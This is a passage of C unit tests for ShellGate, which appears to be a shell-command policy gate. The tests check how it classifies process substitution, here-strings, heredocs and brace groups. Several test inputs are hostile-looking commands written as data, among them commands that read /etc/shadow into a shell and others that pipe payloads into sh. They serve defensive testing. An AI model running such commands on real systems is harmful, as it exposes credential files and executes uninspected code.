  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "sh <<< \"$(cat /etc/shadow)\"", &result));
  ASSERT(
      result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
      result.requires_substitution_evaluation &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      result.subcommand_count == 2 &&
      result.subcommands[0].requires_substitution_evaluation &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  /* Group-owned here-string data reaches its real GROUP owner, then each
   * member receives that inherited inspection and violation context. */
  ASSERT_SG_OK(eval_cmd(gate, "{ sh; cat; } <<< \"$(</etc/shadow)\"", &result));
  ASSERT(
      result.requires_substitution_evaluation &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      result.subcommand_count == 2 &&
      result.subcommands[0].requires_substitution_evaluation &&
      result.subcommands[1].requires_substitution_evaluation &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[1].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  /* A preceding group here-string is transient after the explicit fd-0
   * replacement. The effective final document still carries its dynamic
   * provenance to every member through the GROUP owner. */
  ASSERT_SG_OK(eval_cmd(
      gate, "{ sh; cat; } 3>&1 <<< stale 0<<< \"$(</etc/shadow)\"", &result));
  ASSERT(
      result.requires_substitution_evaluation &&
      result.has_dynamic_substitution_io &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      result.subcommand_count == 2 &&
      result.subcommands[0].requires_substitution_evaluation &&
      result.subcommands[1].requires_substitution_evaluation &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[1].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  /* A process-substitution redirect remains dynamic I/O, but the later
   * here-string's command substitution must still flag the group member that
   * receives its bytes as requiring shell-word inspection. */
  ASSERT_SG_OK(
      eval_cmd(gate, "{ sh; } > >(cat) <<< \"$(printf payload)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 3 &&
         result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation &&
         !result.subcommands[2].requires_substitution_evaluation);

  /* Risk provenance follows real dynamic-byte transforms, rather than
   * assuming that only a direct file-reading producer can be sensitive. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(cat /etc/shadow | sed s/a/b/)", &result));
  ASSERT(result.requires_substitution_evaluation &&
         (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(
      eval_cmd(gate, "echo $(printf '%s' $(cat /etc/shadow))", &result));
  ASSERT(result.requires_substitution_evaluation &&
         (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(
      eval_cmd(gate, "echo $(cat /tmp/ordinary | sed s/a/b/)", &result));
  ASSERT(result.requires_substitution_evaluation &&
         !(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));
  sg_gate_free(gate);
}

TEST(brace_group_process_substitution_result_contract) {
  static const char *rules[] = {"echo *", "printf *", "printf * *", "id",
                                "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const struct {
    const char *command;
    uint32_t command_count;
    uint32_t dynamic_count;
    uint32_t mapping_count;
    bool dynamic[4];
  } cases[] = {
      {"{ printf value; } > >(cat)", 2, 0, 0, {false, false}},
      {"{ printf value >&3; } 3> >(cat)", 2, 0, 0, {false, false}},
      {"{ cat; } < <(printf config)", 2, 0, 0, {false, false}},
      {"{ echo $(id); } & printf after", 3, 1, 1, {true, false, false}},
      {"{ echo $(id); } && printf after", 3, 1, 1, {true, false, false}},
      {"printf before || { echo $(id); }", 3, 1, 1, {false, true, false}},
      {"{ printf value; } 3> >(printf '%s' \"$(id)\")",
       3,
       1,
       1,
       {false, true, false}},
  };

  for (uint32_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == (cases[i].dynamic_count
                                  ? SG_VERDICT_ALLOW_CONDITIONAL
                                  : SG_VERDICT_ALLOW) &&
           result.requires_substitution_evaluation ==
               (cases[i].dynamic_count != 0) &&
           result.has_dynamic_substitution_io &&
           result.subcommand_count == cases[i].command_count);
    uint32_t dynamic_count = 0;
    uint32_t mapping_count = 0;
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      const sg_subcommand_result_t *subcommand = &result.subcommands[command];
      dynamic_count += subcommand->requires_substitution_evaluation;
      mapping_count += subcommand->substitution_consumer_index >= 0;
      ASSERT(subcommand->requires_substitution_evaluation ==
             cases[i].dynamic[command]);
      if (subcommand->substitution_consumer_index >= 0)
        ASSERT(result.subcommands[subcommand->substitution_consumer_index]
                   .has_dynamic_substitution_io);
    }
    ASSERT(dynamic_count == cases[i].dynamic_count &&
           mapping_count == cases[i].mapping_count);
  }
  sg_gate_free(gate);
}

TEST(group_process_substitution_dynamic_consumer_contract) {
  static const char *rules[] = {"sh", "cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const struct {
    const char *command;
    uint32_t command_count;
    bool dynamic[4];
  } cases[] = {
      {"{ sh; cat; } < <(printf payload)", 3, {true, true, false}},
      {"{ { sh; }; cat; } < <(printf payload); printf sibling",
       4,
       {true, true, false, false}},
      {"printf payload > >({ sh; })", 2, {false, true}},
      {"{ printf payload; } 3>> >(cat)", 2, {false, true}},
      {"printf source | { sh; } 3<&0 < <(printf config)",
       3,
       {false, true, false}},
      /* The output process target already has fd 0 from its inner process
       * substitution, so the outer writer has no fabricated dynamic route. */
      {"printf outer > >({ cat; } < <(printf inner))", 3, {false, true, false}},
  };

  for (uint32_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.has_dynamic_substitution_io &&
           result.subcommand_count == cases[i].command_count);
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      ASSERT(!result.subcommands[command].requires_substitution_evaluation);
      ASSERT(result.subcommands[command].has_dynamic_substitution_io ==
             cases[i].dynamic[command]);
      /* GROUP and ENDPOINT ownership are authoritative in the graph; a
       * result must not pretend that one group member is the direct sink. */
      ASSERT(result.subcommands[command].substitution_consumer_index == -1);
    }
  }

  /* The inner command substitution is lexically within the group, but it is
   * not a GROUP-edge descendant. Its direct mapping to `cat` remains useful;
   * it must not itself be marked as an inherited group consumer. */
  sg_result_t result;
  ASSERT_SG_OK(
      eval_cmd(gate, "{ cat < <(printf inner); } < <(printf outer)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 3 &&
         result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[1].has_dynamic_substitution_io &&
         !result.subcommands[2].has_dynamic_substitution_io &&
         result.subcommands[0].substitution_consumer_index == -1 &&
         result.subcommands[1].substitution_consumer_index == 0 &&
         result.subcommands[2].substitution_consumer_index == -1);
  sg_gate_free(gate);
}

TEST(substitution_source_word_contract) {
  static const char *rules[] = {"echo *", "cat", "cat *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "echo \"<(cat)foo\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:<(cat)foo,");
  ASSERT(!result.has_dynamic_substitution_io);
  ASSERT(!result.requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "echo <(cat)foo", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:<(cat)foo,");
  ASSERT(result.has_dynamic_substitution_io);
  ASSERT(!result.requires_substitution_evaluation);

  /* ShellGate builds its policy netargv directly from graph words. It must
   * retain the same escaped process-substitution spelling as Shellsplit's
   * public canonical renderer. */
  ASSERT_SG_OK(eval_cmd(gate, "cat <(printf \\))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,12:<(printf \\)),");

  ASSERT_SG_OK(eval_cmd(gate, "echo foo$(cat)bar", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,12:foo$(cat)bar,");
  ASSERT(result.has_dynamic_substitution_io);
  ASSERT(result.requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(process_substitution_interpreter_input_contract) {
  static const char *rules[] = {"sh", "cat", "cat *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "sh < <(printf 'echo nested')", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation &&
         result.subcommands[1].substitution_consumer_index == 0);

  /* The output form retains a graph endpoint, so no false direct
   * command-to-command mapping is exposed. It reports dynamic descriptor I/O,
   * not a generic request to inspect shell-word content. */
  ASSERT_SG_OK(eval_cmd(gate, "cat log > >(sh)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         result.subcommands[1].has_dynamic_substitution_io &&
         result.subcommands[0].substitution_consumer_index == -1 &&
         result.subcommands[1].substitution_consumer_index == -1);

  ASSERT_SG_OK(eval_cmd(gate, "cat log 2>> >(sh)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         result.subcommands[1].has_dynamic_substitution_io &&
         result.subcommands[0].substitution_consumer_index == -1 &&
         result.subcommands[1].substitution_consumer_index == -1);

  /* A later output redirect or close supersedes the earlier process
   * substitution. The nested command remains an ordinary evaluated command,
   * but Shellgate must not request inspection for an unfed stale endpoint. */
  ASSERT_SG_OK(eval_cmd(gate, "cat log > >(sh) > /tmp/final.out", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat log > >(sh) 1>&-", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(
      eval_cmd(gate, "{ printf payload; } > >(sh) > /tmp/final.out", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(process_substitution_direction_contract) {
  static const char *rules[] = {"sh", "cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  sg_result_t result;
  static const char *const unrouted[] = {
      "cat < >(sh)",
      "cat > <(printf input)",
      "cat><(printf input)",
  };
  for (uint32_t i = 0; i < sizeof(unrouted) / sizeof(unrouted[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, unrouted[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.subcommand_count == 2 &&
           !result.subcommands[0].requires_substitution_evaluation &&
           !result.subcommands[1].requires_substitution_evaluation &&
           result.subcommands[0].substitution_consumer_index == -1 &&
           result.subcommands[1].substitution_consumer_index == -1);
  }

  /* An explicit read/write redirect with an input process substitution feeds
   * cat's fd 0 from the nested producer, but does not turn that descriptor
   * route into shell-word evaluation. */
  static const char *const routed[] = {
      "cat <> <(printf input)",
  };
  for (uint32_t i = 0; i < sizeof(routed) / sizeof(routed[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, routed[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
           result.subcommands[0].has_dynamic_substitution_io &&
           !result.subcommands[1].requires_substitution_evaluation &&
           result.subcommands[0].substitution_consumer_index == -1 &&
           result.subcommands[1].substitution_consumer_index == 0);
  }

  /* `<> >(consumer)` has the same known write route as `> >(consumer)`: the
   * descriptor remains readable too, but its write side supplies the nested
   * consumer's stdin. The selected descriptor is retained even when it is
   * nonstandard. */
  static const char *const read_write_output[] = {
      "cat <> >(sh)",
      "cat 3<> >(sh)",
  };
  for (uint32_t i = 0;
       i < sizeof(read_write_output) / sizeof(read_write_output[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, read_write_output[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
           !result.subcommands[0].requires_substitution_evaluation &&
           result.subcommands[1].has_dynamic_substitution_io &&
           result.subcommands[0].substitution_consumer_index == -1 &&
           result.subcommands[1].substitution_consumer_index == -1);
  }

  ASSERT_SG_OK(eval_cmd(gate, "cat <> >(sh) 0> /tmp/final.out", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(process_substitution_operand_syntax_contract) {
  static const char *rules[] = {"echo *", "printf *", "cat"};
  static const char *invalid[] = {
      "echo > (printf value)",  "echo < (printf value)",
      "echo >> (printf value)", "cat << (EOF",
      "{ echo; } > (cat)",
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  for (uint32_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
    sg_result_t result = {0};
    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           !result.requires_substitution_evaluation);
  }
  sg_gate_free(gate);
}

TEST(command_position_group_syntax_contract) {
  static const char *const invalid[] = {
      "foo; {",  "foo; }",  "foo && {",      "foo && }",   "foo | {",
      "foo | }", "foo | )", "echo { foo; }", "echo (foo)", "echo ((1))",
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
    sg_result_t result = {0};
    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           !result.requires_substitution_evaluation);
  }
  sg_gate_free(gate);
}

static bool make_nested_heredoc_substitution(char *command, size_t capacity,
                                             bool process_substitution) {
  int written = snprintf(command, capacity,
                         process_substitution ? "cat <(cat" : "echo $(cat");
  if (written < 0 || (size_t)written >= capacity)
    return false;
  size_t used = (size_t)written;
  for (uint32_t i = 0; i < 9; i++) {
    written = snprintf(command + used, capacity - used, " <<H%u", i);
    if (written < 0 || (size_t)written >= capacity - used)
      return false;
    used += (size_t)written;
  }
  written = snprintf(command + used, capacity - used, "\n");
  if (written < 0 || (size_t)written >= capacity - used)
    return false;
  used += (size_t)written;
  for (uint32_t i = 0; i < 9; i++) {
    written = snprintf(command + used, capacity - used, "body%u\nH%u\n", i, i);
    if (written < 0 || (size_t)written >= capacity - used)
      return false;
    used += (size_t)written;
  }
  written = snprintf(command + used, capacity - used, ")");
  return written >= 0 && (size_t)written < capacity - used;
}

TEST(substitution_comment_and_heredoc_capacity_contract) {
  static const char *rules[] = {"echo *", "printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const char *const invalid[] = {
      "echo $(printf value # )",
      "cat <(printf value # )",
  };
  for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
    sg_result_t result = {0};
    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           !result.requires_substitution_evaluation);
  }

  sg_result_t result = {0};
  ASSERT_SG_OK(
      eval_cmd(gate, "echo $(printf value # )\nprintf done)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count >= 2);

  for (int process_substitution = 0; process_substitution <= 1;
       process_substitution++) {
    char command[512];
    ASSERT(make_nested_heredoc_substitution(command, sizeof(command),
                                            process_substitution != 0));
    memset(&result, 0, sizeof(result));
    ASSERT(eval_cmd(gate, command, &result) == SG_ERR_TRUNC);
    ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
           result.verdict != SG_VERDICT_ALLOW &&
           result.verdict != SG_VERDICT_ALLOW_CONDITIONAL);
  }
  sg_gate_free(gate);
}

TEST(compound_heredoc_substitution_cross_product_contract) {
  static const char *rules[] = {"cat",      "cat #path", "echo *", "id",
                                "printf *", "./clock",   "sleep *"};
  static const struct {
    const char *command;
    uint32_t subcommand_count;
    uint32_t dynamic_consumers;
    uint32_t command_mappings;
  } cases[] = {
      {"cat <<EOF\n$(</tmp/mixed-file)$(id)$(printf one; printf two)\nEOF", 4,
       1, 1},
      {"cat <<EOF\n$(cat < <(printf config))\nEOF", 3, 2, 2},
      {"cat <<EOF\n$(printf value 2> >(cat))\nEOF", 3, 2, 0},
      {"cat <<EOF\n$( { printf payload; } | ./clock < <(printf config) )\nEOF",
       4, 2, 2},
      {"{ cat <&4; } 3<<EOF 4<&3 3>&-\n$(id)\nEOF", 2, 1, 0},
      {"{ cat <&4; } 3<<EOF 3>&- 4<&3\n$(id)\nEOF", 2, 0, 0},
      {"cat <<A <<B <<C <<D <<E <<F <<G <<H\n"
       "one\nA\ntwo\nB\nthree\nC\nfour\nD\nfive\nE\nsix\nF\n"
       "seven\nG\n$(id)\nH\n",
       2, 1, 1},
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  for (size_t ci = 0; ci < sizeof(cases) / sizeof(cases[0]); ci++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[ci].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == cases[ci].subcommand_count);
    uint32_t dynamic_consumers = 0;
    uint32_t mappings = 0;
    for (uint32_t i = 0; i < result.subcommand_count; i++) {
      dynamic_consumers += result.subcommands[i].has_dynamic_substitution_io;
      mappings += result.subcommands[i].substitution_consumer_index >= 0;
      if (result.subcommands[i].substitution_consumer_index >= 0)
        ASSERT(
            result
                .subcommands[result.subcommands[i].substitution_consumer_index]
                .has_dynamic_substitution_io);
    }
    ASSERT(dynamic_consumers == cases[ci].dynamic_consumers &&
           mappings == cases[ci].command_mappings);
  }

  static const char overflow[] =
      "cat <<A <<B <<C <<D <<E <<F <<G <<H <<I\n"
      "one\nA\ntwo\nB\nthree\nC\nfour\nD\nfive\nE\nsix\nF\n"
      "seven\nG\neight\nH\n$(id)\nI\n";
  sg_result_t result;
  ASSERT(eval_cmd(gate, overflow, &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.verdict != SG_VERDICT_ALLOW &&
         result.verdict != SG_VERDICT_ALLOW_CONDITIONAL);
  sg_gate_free(gate);
}

TEST(compound_brace_substitution_boundary_contract) {
  static const char *rules[] = {"echo *", "id", "cat", "printf *", "sort"};
  static const struct {
    const char *command;
    uint32_t command_count;
    uint32_t dynamic_consumers;
    uint32_t mappings;
  } dynamic_cases[] = {
      {"{ echo $(id); } | cat", 3, 1, 1},
      {"cat <<EOF\n$( { cat < <(printf config); } )\nEOF", 3, 2, 1},
      {"cat <<EOF\n$( { printf value 3> >(cat); } )\nEOF", 3, 2, 0},
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  for (size_t ci = 0; ci < sizeof(dynamic_cases) / sizeof(dynamic_cases[0]);
       ci++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, dynamic_cases[ci].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == dynamic_cases[ci].command_count);
    uint32_t consumers = 0;
    uint32_t mappings = 0;
    for (uint32_t i = 0; i < result.subcommand_count; i++) {
      consumers += result.subcommands[i].has_dynamic_substitution_io;
      mappings += result.subcommands[i].substitution_consumer_index >= 0;
      if (result.subcommands[i].substitution_consumer_index >= 0)
        ASSERT(
            result
                .subcommands[result.subcommands[i].substitution_consumer_index]
                .has_dynamic_substitution_io);
    }
    ASSERT(consumers == dynamic_cases[ci].dynamic_consumers &&
           mappings == dynamic_cases[ci].mappings);
  }

  sg_result_t literal;
  ASSERT_SG_OK(eval_cmd(gate, "{ cat <<'EOF'\n$( { id; } )\nEOF\n}", &literal));
  ASSERT(literal.verdict == SG_VERDICT_ALLOW);
  ASSERT(!literal.requires_substitution_evaluation);
  ASSERT(literal.subcommand_count == 1);
  ASSERT(!literal.subcommands[0].requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(anomaly_group_heredoc_substitution_contract) {
  static const char command[] =
      "cat <<EOF\n$( { printf one; printf two; } )\nEOF";
  sg_gate_t *gate = gate_with_rules((const char *[]){"cat", "printf *"}, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));

  sg_result_t result;
  for (size_t pass = 0; pass < 6; pass++) {
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == 3);
    ASSERT(result.subcommands[0].requires_substitution_evaluation);
    ASSERT(!result.subcommands[1].requires_substitution_evaluation);
    ASSERT(!result.subcommands[2].requires_substitution_evaluation);
    ASSERT(isfinite(result.anomaly_score));
    ASSERT(isfinite(result.anomaly_score_raw));
    ASSERT(isfinite(result.anomaly_score_type));
  }

  size_t vocabulary = sg_gate_anomaly_vocab_size(gate);
  ASSERT(vocabulary > 0);
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(gate, true));
  sg_result_t first;
  sg_result_t second;
  ASSERT_SG_OK(eval_cmd(gate, command, &first));
  ASSERT_SG_OK(eval_cmd(gate, command, &second));
  ASSERT(isfinite(first.anomaly_score) &&
         first.anomaly_score == second.anomaly_score);
  ASSERT(first.anomaly_score_raw == second.anomaly_score_raw);
  ASSERT(first.anomaly_score_type == second.anomaly_score_type);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), vocabulary);
  sg_gate_free(gate);
}

TEST(anomaly_mixed_heredoc_substitution_contract) {
  static const char command[] =
      "cat <<EOF\n$(</tmp/mixed-file)$(id)$(printf one; printf two)\nEOF";
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"cat", "id", "printf *"}, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));

  sg_result_t result;
  for (size_t pass = 0; pass < 6; pass++) {
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == 4);
    ASSERT(isfinite(result.anomaly_score));
    ASSERT(isfinite(result.anomaly_score_raw));
    ASSERT(isfinite(result.anomaly_score_type));
  }

  size_t vocabulary = sg_gate_anomaly_vocab_size(gate);
  ASSERT(vocabulary > 0);
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(gate, true));
  sg_result_t first;
  sg_result_t second;
  ASSERT_SG_OK(eval_cmd(gate, command, &first));
  ASSERT_SG_OK(eval_cmd(gate, command, &second));
  ASSERT(isfinite(first.anomaly_score) &&
         first.anomaly_score == second.anomaly_score);
  ASSERT(first.anomaly_score_raw == second.anomaly_score_raw);
  ASSERT(first.anomaly_score_type == second.anomaly_score_type);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), vocabulary);
  sg_gate_free(gate);
}

/* --- SUGGESTIONS --- */

TEST(suggestion_matrix) {
  static const struct {
    const char *rules[2];
    size_t rule_count;
    const char *command;
    bool enabled;
    size_t minimum_count;
    size_t maximum_count;
    const char *suggestion_fragment;
  } cases[] = {
      {{"cat #path", "ls"}, 2, "cat", true, 1, 2, "cat"},
      {{"cat #path", "cat #path #path"}, 2, "cat", true, 1, 1, "cat"},
      {{"lss", NULL}, 1, "ls", true, 1, 2, "ls"},
      {{"lss", NULL}, 1, "ls", false, 0, 0, NULL},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = gate_with_rules(cases[i].rules, cases[i].rule_count);
    ASSERT_SG_OK(sg_gate_set_suggestions(g, cases[i].enabled));
    sg_result_t r;
    ASSERT(eval_cmd(g, cases[i].command, &r) == SG_OK);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    if (!cases[i].enabled) {
      ASSERT(r.suggestion_count == 0);
    } else {
      ASSERT(r.suggestion_count >= cases[i].minimum_count);
      ASSERT(r.suggestion_count <= cases[i].maximum_count);
      for (size_t j = 0; j < r.suggestion_count; j++) {
        ASSERT(r.suggestions[j] != NULL);
        ASSERT(r.suggestions[j][0] != '\0');
      }
      ASSERT(strstr(r.suggestions[0], cases[i].suggestion_fragment) != NULL);
    }
    sg_gate_free(g);
  }
}

TEST(match_only_path_avoids_suggestion_allocations) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"lss"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));

  st_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.suggestion_count == 0 && result.deny_suggestion_count == 0);
  ASSERT(st_test_alloc_count() == 0);
  st_test_alloc_reset();
  sg_gate_free(gate);
}

/* --- EDGE CASES --- */

TEST(eval_input_contract_matrix) {
  static const struct {
    const char *name;
    const char *command;
    sg_error_t error;
    sg_verdict_t verdict;
    bool add_rule;
  } cases[] = {
      {"empty", "", SG_ERR_INVALID, SG_VERDICT_UNDETERMINED, false},
